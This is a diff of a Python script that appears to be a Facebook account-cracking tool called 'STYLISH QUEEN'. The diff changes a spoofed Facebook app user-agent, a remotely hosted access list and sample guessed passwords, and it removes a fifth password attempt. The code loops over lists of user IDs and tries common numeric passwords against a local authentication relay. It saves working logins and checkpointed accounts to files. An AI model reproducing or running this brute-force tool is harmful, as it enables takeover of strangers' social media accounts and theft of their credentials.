@@ -33,20 +33,19 @@ header = {
     'x-fb-net-hni': repr(sim),
     'x-fb-connection-quality': 'EXCELLENT',
     'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-    'user-agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
     'content-type': 'application/x-www-form-urlencoded',
     'x-fb-http-engine': 'Liger' }
 os.system('git pull')
 os.system('clear')
 logo = """
-\033[1;91m   ▄████████    ▄████████ ███▄▄▄▄    ▄█  
-\033[1;97m  ███    ███   ███    ███ ███▀▀▀██▄ ███  
-\033[1;97m  ███    █▀    ███    ███ ███   ███ ███▌ 
-\033[1;97m  ███          ███    ███ ███   ███ ███▌ 
-\033[1;91m▀███████████ ▀███████████ ███   ███ ███▌ 
+\033[1;91m  ██████████   ██████████ █████████ ▀▀▀
+\033[1;97m  ███    ███   ███    ███ ███   ███ ███ 
+\033[1;97m  ███          ███    ███ ███   ███ ███ 
+\033[1;91m  ██████████   ██████████ ███   ███ ███ 
 \033[1;97m         ███   ███    ███ ███   ███ ███  
-\033[1;97m   ▄█    ███   ███    ███ ███   ███ ███  
-\033[1;91m ▄████████▀    ███    █▀   ▀█   █▀  █▀ -\033[1;97mQUEEN
+\033[1;97m  ███    ███   ███    ███ ███   ███ ███  
+\033[1;91m  ██████████   ███    ███ ███   ███ ███-\033[1;97mQUEEN
 \033[1;91m-----------------------------------------------
 \033[1;97m➣ Author : STYLISH QUEEN
 \033[1;97m➣ Github : https://github.com/stylish-queen
@@ -67,13 +66,13 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/jamxsani/stylish-queen/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/jamxsani/queen/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
         os.system('#')
         os.system('cd ..... && node index.js &')
-        time.sleep(2)
+        time.sleep(6)
         ip()
     else:
         os.system('clear')
@@ -83,7 +82,7 @@ def reg():
         print ' \033[1;92mCopy the id and send to admin'
         print ' \033[1;92mYour id: ' + to
         raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://m.facebook.com/profile.php?id=100057861373806')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100057861373806')
         reg()
 
 
@@ -96,7 +95,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to Facebook ')
-    os.system('xdg-open https://m.facebook.com/profile.php?id=100057861373806')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100057861373806')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -380,13 +379,12 @@ def a_s():
         print logo
         print '\033[1;93m~~~~ Choice pass cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \033[1;93mFor-example:223344,334455,445566,556677\033[1;91m'
+        print ' \033[1;93mFor-example:234567,334455,445566,556677\033[1;91m'
         print 47 * '-'
         pass1 = raw_input(' \033[1;92m[1]Password: ')
         pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
       	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -415,13 +413,12 @@ def a_s():
         print logo
         print '\033[1;93m~~~~ Choice pass cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
+        print ' \033[1;93mFor-example:234567,334455,445566,556677\033[1;91m'
         print 47 * '-'
         pass1 = raw_input(' \033[1;92m[1]Password: ')
         pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -450,13 +447,12 @@ def a_s():
         print logo
         print '\033[1;93m~~~~ Choice pass cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
+        print ' \033[1;93mFor-example:234567,334455,445566,556677\033[1;91m'
         print 47 * '-'
         pass1 = raw_input(' \033[1;92m[1]Password: ')
         pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
-        pass5 = raw_input(' \033[1;92m[5]Password: ')
         try:
 	    idlist= raw_input('[+] File Name: ')
 	    for line in open(idlist ,'r').readlines():
@@ -544,21 +540,6 @@ def a_s():
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
-			else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
-                            q = json.loads(data)
-                            if 'loc' in q:
-                                print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
-                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass5 + '\n')
-                                ok.close()
-                                oks.append(uid + pass5)
-                            elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass5
-                                cp = open('HOP_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass5 + '\n')
-                                cp.close()
-                                cps.apppend(uid + pass5)
         except:
             pass
         
